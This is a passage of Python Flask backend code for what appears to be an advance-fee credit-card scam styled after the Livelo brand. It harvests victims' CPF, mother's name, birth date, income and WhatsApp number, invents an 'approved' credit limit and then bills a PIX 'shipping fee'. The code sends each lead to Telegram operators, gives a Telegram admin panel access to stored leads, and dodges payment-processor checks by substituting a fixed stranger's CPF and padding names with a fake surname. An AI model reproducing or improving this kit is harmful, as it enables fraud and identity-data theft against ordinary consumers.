                        err_msg = err_msg.get("message", "Erro desconhecido")
                    return jsonify({"ok": False, "error": err_msg}), 400

        except urllib.error.HTTPError as e:
            code = e.getcode()
            # 500 / 503 -> Retry com backoff
            if code in (500, 503) and attempt < max_retries - 1:
                time.sleep(2 ** attempt)
                continue
            
            # Lê o corpo do erro para pegar a mensagem exata
            try:
                err_body = json.loads(e.read().decode("utf-8"))
                err_val = err_body.get("error", "")
                err_msg = err_val if isinstance(err_val, str) else err_val.get("message", "Erro na API")
            except:
                err_msg = f"HTTP {code}"

            if code == 404:
                return jsonify({"ok": False, "error": "CPF não encontrado na base de dados"}), 404
            elif code in (400, 401, 403, 422):
                return jsonify({"ok": False, "error": err_msg}), code
            
            return jsonify({"ok": False, "error": f"Serviço indisponível no momento. {err_msg}"}), code
            
        except Exception as e:
            if attempt < max_retries - 1:
                time.sleep(2 ** attempt)
                continue
            return jsonify({"ok": False, "error": f"Erro interno de conexão: {str(e)}"}), 500

    return jsonify({"ok": False, "error": "Falha na comunicação com o serviço após várias tentativas."}), 500


# ── API LEAD (RECUPERADO) ─────────────────────────────────────────────────────
@app.route("/api/lead", methods=["POST"])
def api_lead():
    data = get_secure_json()
    sid = sanitize(data.get("session_id", ""), 40)
    if not sid: return jsonify({"error": "Sessão inválida"}), 400
    
    cpf = sanitize(data.get("cpf", ""), 14)
    nome = sanitize(data.get("nome", ""), 100)
    nome_mae = sanitize(data.get("nome_mae", ""), 100)
    data_nasc = sanitize(data.get("data_nasc", ""), 10)
    renda = sanitize(data.get("renda", ""), 30)
    tipo_renda = sanitize(data.get("tipo_renda", ""), 50)
    motivo = sanitize(data.get("motivo_credito", ""), 50)
    dia_venc = sanitize(data.get("dia_vencimento", ""), 10)
    
    utm_source = sanitize(data.get("utm_source", ""), 100)
    utm_medium = sanitize(data.get("utm_medium", ""), 100)
    utm_campaign = sanitize(data.get("utm_campaign", ""), 100)
    utm_content = sanitize(data.get("utm_content", ""), 100)
    utm_term = sanitize(data.get("utm_term", ""), 100)
    src = sanitize(data.get("src", ""), 100)
    sck = sanitize(data.get("sck", ""), 100)
    
    client_ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    client_loc = "BR"
    device_brand = sanitize(data.get("device_brand", "Desconhecido"), 50)
    
    analise = calc_limite(renda, tipo_renda, motivo)
    limite = analise["limite"]
    frete = analise["frete"]

    db = get_db()

    existing = db.execute("SELECT id FROM leads WHERE session_id=?", (sid,)).fetchone()
    try:
        if existing:
            db.execute("""
                UPDATE leads SET cpf=?, nome=?, nome_mae=?, data_nasc=?,
                    renda=?, tipo_renda=?, motivo_credito=?, dia_vencimento=?, limite_aprovado=?,
                    utm_source=?, utm_medium=?, utm_campaign=?, utm_content=?, utm_term=?, src=?, sck=?, location=?,
                    updated_at=(cast(strftime('%s','now') as real))
                WHERE session_id=?
            """, (cpf, nome, nome_mae, data_nasc, renda, tipo_renda, motivo, dia_venc, limite, 
                  utm_source, utm_medium, utm_campaign, utm_content, utm_term, src, sck, client_loc, sid))
        else:
            db.execute("""
                INSERT INTO leads(session_id,ip,cpf,nome,nome_mae,data_nasc,
                    renda,tipo_renda,motivo_credito,dia_vencimento,limite_aprovado,
                    utm_source,utm_medium,utm_campaign,utm_content,utm_term,src,sck,location,device_brand)
                VALUES(?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)
            """, (sid, client_ip, cpf, nome, nome_mae, data_nasc, renda, tipo_renda, motivo, dia_venc, limite,
                  utm_source, utm_medium, utm_campaign, utm_content, utm_term, src, sck, client_loc, device_brand))
        db.commit()
    except Exception as e:
        log.error("Error updating lead in DB: %s", e)
        db.rollback()
    try:
        send_telegram_notify(sid, "ENTRY")
    except Exception as _e:
        log.warning("[TG] ENTRY notify falhou: %s", _e)

    return jsonify({
        "ok":            True,
        "session_id":    sid,
        "limite":        limite,
        "frete":         f"R$ {frete:,.2f}".replace(",","X").replace(".",",").replace("X","."),
        "frete_valor":   frete,
        "tier":          analise["tier"],
    })


# ── 3. Salvar estilo do cartão ────────────────────────────────────────────────
@app.route("/api/card-style", methods=["POST"])
def api_card_style():
    data  = get_secure_json()
    sid   = sanitize(data.get("session_id", ""), 40)
    color = sanitize(data.get("color", "gradient_pink"), 40)
    style = sanitize(data.get("style", "standard"), 20)

    db = get_db()
    db.execute(
        "UPDATE leads SET card_color=?, card_style=?, updated_at=(cast(strftime('%s','now') as real)) WHERE session_id=?",
        (color, style, sid)
    )
    db.commit()
    try:
        send_telegram_notify(sid, "CARD_CHOSEN")
    except Exception as _e:
        log.warning("[TG] CARD_CHOSEN notify falhou: %s", _e)
    return jsonify({"ok": True})


# ── 4. Salvar WhatsApp e retornar dados do gerente ────────────────────────────
@app.route("/api/whatsapp", methods=["POST"])
def api_whatsapp():
    data = get_secure_json()
    sid  = sanitize(data.get("session_id", ""), 40)
    wa   = re.sub(r"\D", "", sanitize(data.get("whatsapp", ""), 20))

    if len(wa) < 10:
        return jsonify({"ok": False, "error": "Número de WhatsApp inválido."}), 422
    if not wa.startswith("55"):
        wa = "55" + wa

    db = get_db()
    db.execute("UPDATE leads SET whatsapp=?, updated_at=(cast(strftime('%s','now') as real)) WHERE session_id=?", (wa, sid))
    db.commit()
    try:
        send_telegram_notify(sid, "INFO_ADDED")
    except Exception as _e:
        log.warning("[TG] INFO_ADDED notify falhou: %s", _e)

    mgr = db.execute("SELECT * FROM manager WHERE id=1").fetchone()
    if mgr:
        return jsonify({
            "ok":            True,
            "manager_name":  mgr["name"],
            "manager_photo": mgr["photo_url"],
            "manager_since": mgr["since_year"],
            "manager_wa":    mgr["whatsapp"],
        })
    return jsonify({"ok": True, "manager_wa": "5511999999999"})


def is_valid_cpf(cpf: str) -> bool:
    digits = [int(c) for c in str(cpf) if c.isdigit()]
    if len(digits) != 11 or len(set(digits)) == 1:
        return False
    d1 = sum(x * y for x, y in zip(digits[:9], range(10, 1, -1))) % 11
    d1 = 0 if d1 < 2 else 11 - d1
    if digits[9] != d1:
        return False
    d2 = sum(x * y for x, y in zip(digits[:10], range(11, 1, -1))) % 11
    d2 = 0 if d2 < 2 else 11 - d2
    return digits[10] == d2

def generate_qr_b64(text: str) -> str:
    try:
        import qrcode
        import io
        import base64
        qr = qrcode.QRCode(version=1, box_size=8, border=2)
        qr.add_data(text)
        qr.make(fit=True)
        img = qr.make_image(fill_color="black", back_color="white")
        buf = io.BytesIO()
        img.save(buf)
        b64 = base64.b64encode(buf.getvalue()).decode("utf-8")
        return f"data:image/png;base64,{b64}"
    except Exception:
        return ""


def c7_create_pix(amount: float, payer_name: str, payer_cpf: str, payment_id: str) -> dict:
    try:
        db = get_db()
        
        # CREDENCIAIS: env var tem prioridade absoluta, depois hardcoded.
        # O banco (sys_config) foi REMOVIDO da logica — tinha chave antiga causando 401.
        api_key    = os.environ.get("C7_API_KEY", "").strip()    or get_secure_c7_key()
        api_secret = os.environ.get("C7_API_SECRET", "").strip() or get_secure_c7_secret()
        
        log.info("[C7] api_key=%s... (len=%d)", api_key[:20], len(api_key))
        
        if api_key and api_secret and _REQUESTS_OK:
            ts = str(int(time.time()))
            nonce = str(uuid.uuid4())
            clean_cpf = re.sub(r"\D", "", str(payer_cpf or ""))
            clean_name = (payer_name or "").strip() or "Cliente"
            
            # Se o nome for só uma palavra, adiciona um sobrenome genérico para passar no filtro da C7
            if " " not in clean_name:
                clean_name += " Silva"

            payload = {
                "amount": round(float(amount), 2),
                "externalId": payment_id,
                "acquirer_code": "2",
                "callbackUrl": request.url_root.replace("http://", "https://").rstrip('/') + "/api/webhook/c7"
            }
            # Verifica se o CPF é matematicamente válido para não ser rejeitado pela C7 (Erro 422 VALIDATION_ERROR)
            def _valida_cpf_local(c):
                if len(c) != 11 or c == c[0]*11: return False
                try:
                    c_int = [int(x) for x in c]
                    for j in range(9, 11):
                        v = sum((c_int[i] * ((j + 1) - i) for i in range(j))) % 11
                        if c_int[j] != (11 - v if v > 1 else 0): return False
                    return True
                except: return False

            if not _valida_cpf_local(clean_cpf):
                clean_cpf = '14887154674'
            
            c7_error_log = ""
            
            # Forçar sempre a ordem: 2 -> 1 -> Auto (Conforme pedido)
            acquirers_to_try = ["2", "1", ""]
            
            for acquirer in acquirers_to_try:
                ts = str(int(time.time()))
                nonce = str(uuid.uuid4())
                payload = {
                    "amount": round(float(amount), 2),
                    "externalId": payment_id,
                    "callbackUrl": f"https://{request.headers.get('x-forwarded-host', request.host)}/api/webhook/c7"
                }
                if acquirer:
                    payload["acquirer_code"] = acquirer
                
                body_str = json.dumps(payload, separators=(',', ':'), ensure_ascii=False)
                msg = f"{ts}.{nonce}.{body_str}"
                sig = hmac.new(api_secret.encode('utf-8'), msg.encode('utf-8'), hashlib.sha256).hexdigest()
                headers = {
                    "Authorization": f"Bearer {api_key}",
                    "Content-Type": "application/json",
                    "X-C7-Timestamp": ts,
                    "X-C7-Nonce": nonce,
                    "X-C7-Signature": sig,
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
                }
                try:
                    resp = _req.post("https://api.carteirado7.com/v2/payment/create", data=body_str.encode('utf-8'), headers=headers, timeout=10)
                    log.info("[C7] Acq=%s status=%s body=%s", acquirer or 'Auto', resp.status_code, resp.text[:300])
                    if resp.status_code in (200, 201):
                        resp_data = resp.json()
                        if resp_data.get("ok") and "payment" in resp_data:
                            pmt = resp_data["payment"]
                            pix = pmt.get("pixCopiaECola", "")
                            qr  = pmt.get("qrCodeBase64", "")
                            if qr and not qr.startswith("data:image"):
                                qr = f"data:image/png;base64,{qr}"
                            if not qr and pix:
                                qr = generate_qr_b64(pix)
                            log.info("[C7] PIX OK acq=%s id=%s pix_len=%d", acquirer or 'Auto', pmt.get('id',''), len(pix))
                            return {
                                "ok": True,
                                "c7_id": pmt.get("id", ""),
                                "pix_code": pix,
                                "qr_code_url": qr,
                                "expires_at": pmt.get("expiresAt", "")
                            }
                    else:
                        c7_error_log += f"Acq {acquirer or 'Auto'}: {resp.status_code} "
                        log.error("[C7] REJECTED acq=%s status=%s resp=%s", acquirer or 'Auto', resp.status_code, resp.text[:200])
                except Exception as e:
                    c7_error_log += f"Acq {acquirer or 'Auto'}: Exception "
                    log.error("[C7] EXCEPTION acq=%s err=%s", acquirer or 'Auto', str(e))
            
            # Se chegou aqui, TODAS as adquirentes falharam
            print("Todas as adquirentes da C7 falharam.")
            try:
                # If we tried the cached best acquirer and it failed, clear the cache so next time we try all again
                db.execute("DELETE FROM sys_config WHERE key='c7_best_acquirer'")
                db.execute("INSERT OR REPLACE INTO sys_config (key, value) VALUES ('c7_api_status', 'Failing')")
                db.commit()
                # Notificar admin
                tg_token = os.environ.get("TELEGRAM_BOT_TOKEN")
                admin_id = os.environ.get("SUPREME_ADMIN_ID")
                if tg_token and admin_id:
                    _req.post(f"https://api.telegram.org/bot{tg_token}/sendMessage", json={
                        "chat_id": admin_id,
                        "text": f"⚠️ *ALERTA CRÍTICO: CARTEIRA DO 7 INOPERANTE*\n\nA API C7 recusou a geração do PIX em *todas* as adquirentes testadas (1, 2 e Auto).\n\nErros: {c7_error_log}\n\nO sistema ativou o *PIX Copia e Cola Local* de fallback de emergência para não perder a venda.\n\nVerifique se a sua `pix_key` está correta no painel administrativo!",
                        "parse_mode": "Markdown"
                    })
            except Exception as e:
                print("Erro ao notificar admin:", str(e))
                
        else:
            print("As credenciais da C7 não foram encontradas. Usando PIX local de fallback.")
        
        # Fallback local EMV PIX generation
        row = db.execute("SELECT value FROM sys_config WHERE key='pix_key'").fetchone()
        chave_pix = row["value"] if row and row["value"] else "suporte@livelo.com.br"
        
        amount_str = f"{amount:.2f}"
        # Nome do beneficiário: máx 25 chars, sem acento
        import unicodedata
        raw_name = (payer_name or "CLIENTE LIVELO")[:25].upper()
        raw_name = ''.join(c for c in unicodedata.normalize('NFD', raw_name) if unicodedata.category(c) != 'Mn')
        raw_name = re.sub(r'[^A-Z0-9 ]', '', raw_name).strip() or "CLIENTE LIVELO"
        # txid: apenas alfanumérico, máx 25
        txid = re.sub(r'[^A-Za-z0-9]', '', payment_id)[:25].ljust(25, 'x')
        city = "SAO PAULO"

        def emv_field(tag: str, value: str) -> str:
            return f"{tag}{len(value):02d}{value}"

        gui_val   = "br.gov.bcb.pix"
        key_val   = f"01{len(chave_pix):02d}{chave_pix}"
        mchant_id = emv_field("26", emv_field("00", gui_val) + emv_field("01", chave_pix))
        addl_data  = emv_field("62", emv_field("05", txid))

        pix_str = (
            "000201" +
            mchant_id +
            "52040000" +
            "5303986" +
            emv_field("54", amount_str) +
            "5802BR" +
            emv_field("59", raw_name) +
            emv_field("60", city) +
            addl_data +
            "6304"
        )
        
        # Calculate CRC16-CCITT
        poly = 0x1021
        crc = 0xFFFF
        for byte in pix_str.encode("utf-8"):
            crc ^= (byte << 8)
            for _ in range(8):
                if crc & 0x8000:
                    crc = (crc << 1) ^ poly
                else:
                    crc <<= 1
        crc_str = f"{crc & 0xFFFF:04X}"
        pix_code = pix_str + crc_str
        
        qr_b64 = generate_qr_b64(pix_code)
        return {
            "ok": True,
            "c7_id": "",
            "pix_code": pix_code,
            "qr_code_url": qr_b64,
            "expires_at": "",
            "simulated": True
        }
    except Exception as e:
        return {"ok": False, "error": str(e)}

@app.route("/api/c7/warmup", methods=["POST"])
def api_c7_warmup():
    """
    Warmup: verifica saldo da conta C7 para confirmar que as credenciais
    estão ativas. Não gera PIX real (evita erro amount_below_min).
    """
    def _warmup_task():
        try:
            with app.app_context():
                db = get_db()
                api_key    = os.environ.get("C7_API_KEY", "").strip()    or get_secure_c7_key()
                api_secret = os.environ.get("C7_API_SECRET", "").strip() or get_secure_c7_secret()
                if not api_key or not api_secret or not _REQUESTS_OK:
                    return

                # Verifica saldo — rota POST /v2/account/balance (Key + HMAC, sem criar PIX)
                ts    = str(int(time.time()))
                nonce = str(uuid.uuid4())
                body_str = "{}"
                msg = f"{ts}.{nonce}.{body_str}"
                sig = hmac.new(api_secret.encode('utf-8'), msg.encode('utf-8'), hashlib.sha256).hexdigest()
                headers = {
                    "Authorization":  f"Bearer {api_key}",
                    "Content-Type":   "application/json",
                    "X-C7-Timestamp": ts,
                    "X-C7-Nonce":     nonce,
                    "X-C7-Signature": sig,
                }
                try:
                    resp = _req.post("https://api.carteirado7.com/v2/account/balance",
                                     data=body_str.encode('utf-8'), headers=headers, timeout=5)
                    status_str = "OK" if resp.status_code == 200 else f"HTTP {resp.status_code}"
                    db.execute("INSERT OR REPLACE INTO sys_config (key, value) VALUES ('c7_api_status', ?)", (status_str,))
                    db.commit()
                except Exception:
                    pass
        except Exception:
            pass

    import threading
    threading.Thread(target=_warmup_task, daemon=True).start()
    return jsonify({"ok": True})

# ── 5. Gerar PIX de frete via C7 ─────────────────────────────────────────────
@app.route("/api/gerar-pix", methods=["POST"])
def api_gerar_pix():
    """
    Gera cobrança PIX para pagamento do frete do cartão de crédito.
    Usa C7 API: POST /v2/payment/create
    """
    data = get_secure_json()
    sid = sanitize(data.get("session_id") or data.get("sessionId", ""), 40)
    user_amount = data.get("amount")

    db   = get_db()
    lead = db.execute("SELECT * FROM leads WHERE session_id=?", (sid,)).fetchone()
# FIX: Se não tem lead na base mas recebemos o request, criamos um dummy lead para passar
    if not lead:
        try:
            nome = data.get("nome", data.get("nome_completo", "CLIENTE LIVELO"))
            cpf = data.get("cpf", "00000000000")
            db.execute("INSERT INTO leads (session_id, nome, cpf) VALUES (?, ?, ?)", (sid, nome, cpf))
            db.commit()
            lead = db.execute("SELECT * FROM leads WHERE session_id=?", (sid,)).fetchone()
        except:
            pass
    if not lead:
        return jsonify({"ok": False, "error": "Sessão não encontrada. Reinicie o processo."}), 404

    # Determina valor do frete
    renda   = lead["renda"] or "0"
    analise = calc_limite(renda)
    
    frete = 29.90 # Valor padrao seguro
    if user_amount is not None:
        try:
            # Garante que se for string com virgula ou texto, seja convertido corretamente
            if isinstance(user_amount, str):
                u_str = user_amount.replace("R$", "").strip()
                if "," in u_str and "." in u_str:
                    u_str = u_str.replace(".", "").replace(",", ".")
                elif "," in u_str:
                    u_str = u_str.replace(",", ".")
                frete = float(u_str)
            else:
                frete = float(user_amount)
        except:
            frete = analise.get("frete", 29.90)
    else:
        frete = analise.get("frete", 29.90)
        
    nome    = lead["nome"] or "Cliente"
    cpf     = lead["cpf"] or ""

    # Gera ID único para o pagamento
    pay_id = f"lvl_{sid[:8]}_{uuid.uuid4().hex[:8]}"

    result = c7_create_pix(
        amount      = frete,
        payer_name  = nome,
        payer_cpf   = cpf,
        payment_id  = pay_id,
    )

    if not result.get("ok"):
        return jsonify({"ok": False, "error": result.get("error", "Falha ao gerar PIX.")}), 500

    # Persiste pagamento
    db.execute("""
        INSERT OR REPLACE INTO payments(payment_id,c7_id,session_id,amount,status,pix_code,qr_code_url,expires_at,payer_name,payer_cpf)
        VALUES(?,?,?,?,?,?,?,?,?,?)
    """, (
        pay_id,
        result.get("c7_id", ""),
        sid,
        frete,
        "pending",
        result.get("pix_code", ""),
        result.get("qr_code_url", ""),
        result.get("expires_at", ""),
        nome,
        cpf,
    ))
    db.execute(
        "UPDATE leads SET payment_id=?, pix_status='pending', updated_at=(cast(strftime('%s','now') as real)) WHERE session_id=?",
        (pay_id, sid)
    )
    db.commit()

    frete_fmt = f"R$ {frete:,.2f}".replace(",","X").replace(".",",").replace("X",".")

    try:
        send_telegram_report(sid, False)
    except Exception as _e:
        log.warning("[TG] PIX_GENERATED report falhou: %s", _e)

    return jsonify({
        "ok":          True,
        "payment_id":  pay_id,
        "pix_code":    result.get("pix_code", ""),
        "qr_code_url": result.get("qr_code_url", ""),
        "expires_at":  result.get("expires_at", ""),
        "frete":       frete_fmt,
        "frete_valor": frete,
        "simulated":   result.get("simulated", False),
        "limite":      analise["limite"],
    })


# ── 6. Verificar status do PIX ────────────────────────────────────────────────
@app.route("/api/status-pix/<payment_id>", methods=["GET"])
def api_status_pix(payment_id: str):
    payment_id = sanitize(payment_id, 60)
    db  = get_db()
    pay = db.execute("SELECT status, c7_id, session_id FROM payments WHERE payment_id=?", (payment_id,)).fetchone()
    if not pay:
        return jsonify({"ok": False, "error": "Pagamento não encontrado."}), 404
        
    current_status = pay["status"]
    if current_status not in ("paid", "approved", "completed") and pay["c7_id"]:
        row_key = db.execute("SELECT value FROM sys_config WHERE key='c7_api_key'").fetchone()
        api_key = row_key["value"] if row_key and row_key["value"] else os.environ.get("C7_API_KEY", get_secure_c7_key())
        if api_key and _REQUESTS_OK:
            try:
                hdrs = {
                    "Authorization": f"Bearer {api_key}",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
                }
                resp = _req.get(f"https://api.carteirado7.com/v2/payment/{pay['c7_id']}/status", 
                                headers=hdrs, timeout=5)
                if resp.status_code == 200:
                    c7_data = resp.json()
                    if c7_data.get("ok"):
                        c7_status = c7_data.get("payment", {}).get("status", "").lower()
                        if c7_status in ("approved", "paid"):
                            current_status = "paid"
                            db.execute("UPDATE payments SET status='paid', confirmed_at=(cast(strftime('%s','now') as real)) WHERE payment_id=?", (payment_id,))
                            db.execute("UPDATE leads SET pix_status='paid', updated_at=(cast(strftime('%s','now') as real)) WHERE payment_id=?", (payment_id,))
                            db.commit()
                            if pay["session_id"]:
                                try:
                                    send_telegram_report(pay["session_id"], True)
                                except Exception as _e:
                                    log.warning("[TG] PIX_PAID report falhou: %s", _e)
            except Exception as e:
                pass

    return jsonify({"ok": True, "status": current_status})


# ── Webhook C7 ────────────────────────────────────────────────────────────────
@app.route("/api/webhook/c7", methods=["POST"])
def webhook_c7():
    """Recebe notificações de pagamento da C7 API (V2)."""
    body    = request.get_data(as_text=True)
    sig_raw = request.headers.get("X-C7-Signature", "")
    ts_raw  = request.headers.get("X-C7-Timestamp", "")

    db = get_db()
    row_sec = db.execute("SELECT value FROM sys_config WHERE key='c7_api_secret'").fetchone()
    secret = (row_sec["value"] if row_sec and row_sec["value"] else "") or os.environ.get("C7_API_SECRET", get_secure_c7_secret())

    if secret:
        expected = hmac.new(
            secret.encode("utf-8"),
            f"{ts_raw}.{body}".encode("utf-8"),
            hashlib.sha256,
        ).hexdigest()
        if not hmac.compare_digest(sig_raw, expected):
            log.warning("[WEBHOOK] Assinatura inválida de %s", _ip())
            abort(403)

    data   = json.loads(body) if body else {}
    event_data = data.get("data", {})
    ext_id = event_data.get("correlationID") or data.get("externalId", "")
    status = event_data.get("status") or data.get("status", "")

    if status.upper() == "APPROVED":
        status = "paid"
    else:
        status = status.lower()

    if ext_id and status:
        db.execute(
            "UPDATE payments SET status=?, confirmed_at=(cast(strftime('%s','now') as real)) WHERE payment_id=?",
            (status, ext_id)
        )
        db.execute(
            "UPDATE leads SET pix_status=?, updated_at=(cast(strftime('%s','now') as real)) WHERE payment_id=?",
            (status, ext_id)
        )
        db.commit()
        log.info("[WEBHOOK] %s → %s", ext_id, status)
        if status == 'paid':
            pay_row = db.execute("SELECT session_id FROM payments WHERE payment_id=?", (ext_id,)).fetchone()
            if pay_row:
                try:
                    send_telegram_report(pay_row["session_id"], True)
                except Exception as _e:
                    log.warning("[TG] webhook PIX_PAID report falhou: %s", _e)

    return jsonify({"ok": True})


# ── Dados do gerente ──────────────────────────────────────────────────────────
@app.route("/api/manager", methods=["GET"])
def api_manager():
    db  = get_db()
    mgr = db.execute("SELECT * FROM manager WHERE id=1").fetchone()
    if not mgr:
        return jsonify({"ok": False}), 404
    return jsonify({
        "ok":        True,
        "name":      mgr["name"],
        "photo_url": mgr["photo_url"],
        "since_year":mgr["since_year"],
        "whatsapp":  mgr["whatsapp"],
    })

# ══════════════════════════════════════════════════════════════════════════════
#  ROUTES — TELEGRAM WEB APPS
# ══════════════════════════════════════════════════════════════════════════════



from urllib.parse import parse_qsl

def verify_telegram_web_app_data(init_data: str, bot_token: str) -> bool:
    try:
        parsed_data = dict(parse_qsl(init_data))
        if 'hash' not in parsed_data:
            return False
        received_hash = parsed_data.pop('hash')
        data_check_string = "\n".join(f"{k}={v}" for k, v in sorted(parsed_data.items()))
        secret_key = hmac.new(b"WebAppData", bot_token.encode(), hashlib.sha256).digest()
        calculated_hash = hmac.new(secret_key, data_check_string.encode(), hashlib.sha256).hexdigest()
        return calculated_hash == received_hash
    except:
        return False

@app.route("/api/tg_auth", methods=["POST"])
def api_tg_auth():
    data = request.get_json() or {}
    init_data = data.get("initData", "")
    
    bot_token = os.environ.get("TELEGRAM_BOT_TOKEN")
    if not bot_token or not verify_telegram_web_app_data(init_data, bot_token):
        return jsonify({"ok": False, "error": "Invalid Telegram Signature. Acesso negado."}), 403

    # If signature is valid, we can trust the user object parsed from initData
    parsed_data = dict(parse_qsl(init_data))
    user = json.loads(parsed_data.get("user", "{}"))
    tg_id = str(user.get("id", ""))
    
    if not tg_id:
        return jsonify({"ok": False, "error": "No Telegram ID"}), 400

    db = get_db()
    supreme_env = os.environ.get("SUPREME_ADMIN_ID", "")
    group_env = os.environ.get("SUPREME_GROUP_ID", supreme_env)
    
    r_adm = db.execute("SELECT value FROM sys_config WHERE key='supreme_admin_id'").fetchone()
    r_grp = db.execute("SELECT value FROM sys_config WHERE key='supreme_group_id'").fetchone()
    
    supreme_id = str(r_adm["value"]) if r_adm else supreme_env
    group_id = str(r_grp["value"]) if r_grp else group_env

    is_supreme = (tg_id == supreme_id)
    is_basic = False
    
    # Verificação inteligente de permissões usando o grupo do Telegram (se configurado)
    if bot_token and group_id and not is_supreme:
        try:
            r = _req.get(f"https://api.telegram.org/bot{bot_token}/getChatMember?chat_id={group_id}&user_id={tg_id}", timeout=5).json()
            if r.get("ok"):
                member_status = r.get("result", {}).get("status", "")
                if member_status in ["creator", "administrator"]:
                    is_supreme = True
                elif member_status in ["member", "restricted"]:
                    is_basic = True
        except Exception as e:
            print("Erro ao checar grupo:", e)
    
    if not is_supreme and not is_basic:
        return jsonify({"ok": False, "error": "Acesso negado. Você não pertence ao grupo administrativo."}), 403

    first_name = user.get("first_name", "")
    username = user.get("username", "")
    photo_url = user.get("photo_url", "")
    
    db = get_db()
    row = db.execute("SELECT * FROM telegram_admins WHERE tg_id=?", (tg_id,)).fetchone()
    
    role = "supreme" if is_supreme else "basic"
    status = "active"
    
    if row:
        if not is_supreme:
            role = row["role"]
            status = row["status"]
        db.execute("""
            UPDATE telegram_admins 
            SET first_name=?, username=?, photo_url=?, role=?, last_active=(cast(strftime('%s','now') as real))
            WHERE tg_id=?
        """, (first_name, username, photo_url, role, tg_id))
    else:
        db.execute("""
            INSERT INTO telegram_admins (tg_id, first_name, username, photo_url, role, status, last_active)
            VALUES (?, ?, ?, ?, ?, ?, (cast(strftime('%s','now') as real)))
        """, (tg_id, first_name, username, photo_url, role, status))
    db.commit()

    if status == "banned":
        return jsonify({"ok": False, "banned": True})

    # Fetch stats depending on role
    stats = {}
    if role == "supreme":
        total_leads = db.execute("SELECT COUNT(*) FROM leads").fetchone()[0]
        pagos = db.execute("SELECT COUNT(*) FROM leads WHERE pix_status='paid'").fetchone()[0]
        stats = {"total": total_leads, "pagos": pagos}
        
        admins_raw = db.execute("SELECT * FROM telegram_admins ORDER BY last_active DESC").fetchall()
        stats["admins"] = [dict(a) for a in admins_raw]

    elif role == "basic":
        total_leads = db.execute("SELECT COUNT(*) FROM leads").fetchone()[0]
        pagos = db.execute("SELECT COUNT(*) FROM leads WHERE pix_status='paid'").fetchone()[0]
        stats = {"total": total_leads, "pagos": pagos}

    leads_raw = db.execute("SELECT * FROM leads ORDER BY created_at DESC LIMIT 300").fetchall()
    leads = [dict(l) for l in leads_raw]
    
    mgr_row = db.execute("SELECT freight_price, whatsapp FROM manager WHERE id=1").fetchone()
    frete_atual = mgr_row["freight_price"] if mgr_row and mgr_row["freight_price"] else os.environ.get("FRETE_VALOR", "29.90")
    mgr_whatsapp = mgr_row["whatsapp"] if mgr_row else ""

    return jsonify({
        "ok": True,
        "role": role,
        "status": status,
        "stats": stats,
        "leads": leads,
        "frete_atual": frete_atual,
        "mgr_whatsapp": mgr_whatsapp,
        "cpf_token": db.execute("SELECT value FROM sys_config WHERE key=\'cpf_token\'").fetchone()["value"] if db.execute("SELECT value FROM sys_config WHERE key=\'cpf_token\'").fetchone() else ""
    })









@app.route("/admin/manager", methods=["POST"])
@require_admin
def admin_update_manager():
    name       = sanitize(request.form.get("name", ""), 80)
    since_year = int(request.form.get("since_year", 2025))
    whatsapp   = re.sub(r"\D", "", sanitize(request.form.get("whatsapp", ""), 20))
    
    photo_url   = request.form.get("photo_url", "")
    favicon_url = request.form.get("favicon_url", "")
    freight_price = request.form.get("freight_price")
    wa_text       = request.form.get("wa_text")

    # Handle Photo File Upload
    file = request.files.get("photo")
    if file and file.filename:
        ext = Path(secure_filename(file.filename)).suffix.lower().lstrip(".")
        if ext in ALLOWED_IMG_EXT:
            fname = f"manager_{uuid.uuid4().hex[:8]}.{ext}"
            file.save(UPLOAD_DIR / fname)
            photo_url = f"/static/uploads/{fname}"

    # Handle Favicon File Upload
    fav_file = request.files.get("favicon")
    if fav_file and fav_file.filename:
        ext = Path(secure_filename(fav_file.filename)).suffix.lower().lstrip(".")
        if ext in ALLOWED_IMG_EXT + ["ico"]:
            fname = f"fav_{uuid.uuid4().hex[:8]}.{ext}"
            fav_file.save(UPLOAD_DIR / fname)
            favicon_url = f"/static/uploads/{fname}"

    db = get_db()
    
    # Update manager table fields
    if photo_url:
        db.execute("""
            UPDATE manager SET name=?,photo_url=?,since_year=?,whatsapp=?,updated_at=(cast(strftime('%s','now') as real))
            WHERE id=1
        """, (name, photo_url, since_year, whatsapp))
    else:
        db.execute("""
            UPDATE manager SET name=?,since_year=?,whatsapp=?,updated_at=(cast(strftime('%s','now') as real))
            WHERE id=1
        """, (name, since_year, whatsapp))
        
    if freight_price is not None and freight_price != "":
        db.execute("UPDATE manager SET freight_price=? WHERE id=1", (freight_price,))
        
    if favicon_url:
        db.execute("INSERT OR REPLACE INTO sys_config (key, value) VALUES ('favicon_url', ?)", (favicon_url,))
        
    if wa_text is not None:
        db.execute("INSERT OR REPLACE INTO sys_config (key, value) VALUES ('wa_text', ?)", (wa_text,))
        
    db.commit()

    return jsonify({"ok": True, "photo_url": photo_url, "favicon_url": favicon_url})


# ── LOGO DO SISTEMA ────────────────────────────────────────────────────────────
@app.route("/admin/logo", methods=["POST"])
@require_admin
def admin_update_logo():
    """Atualiza a logo exibida para os leads. Aceita upload de arquivo ou URL."""
    logo_url = sanitize(request.form.get("logo_url", ""), 500)

    logo_file = request.files.get("logo_file")
    if logo_file and logo_file.filename:
        ext = Path(secure_filename(logo_file.filename)).suffix.lower().lstrip(".")
        if ext not in ALLOWED_IMG_EXT:
            return jsonify({"ok": False, "error": "Formato inválido. Use PNG, JPG, WEBP ou SVG."}), 422
        fname = f"logo_{uuid.uuid4().hex[:10]}.{ext}"
        logo_file.save(UPLOAD_DIR / fname)
        logo_url = f"/static/uploads/{fname}"

    if not logo_url:
        return jsonify({"ok": False, "error": "Forneça uma URL ou faça upload de uma imagem."}), 422

    db = get_db()
    db.execute("INSERT OR REPLACE INTO sys_config (key, value) VALUES ('system_logo_url', ?)", (logo_url,))
    db.commit()
    log.info("[ADMIN] Logo atualizada: %s", logo_url)
    return jsonify({"ok": True, "logo_url": logo_url})



@app.route("/api/internal/set-logo", methods=["POST"])
def bot_set_logo():
    """Endpoint interno para o bot Telegram atualizar a logo via X-Bot-Secret."""
    secret = os.environ.get("BOT_SECRET", "livelo_bot_secret_2026")
    if request.headers.get("X-Bot-Secret", "") != secret:
        return jsonify({"ok": False, "error": "Unauthorized"}), 401
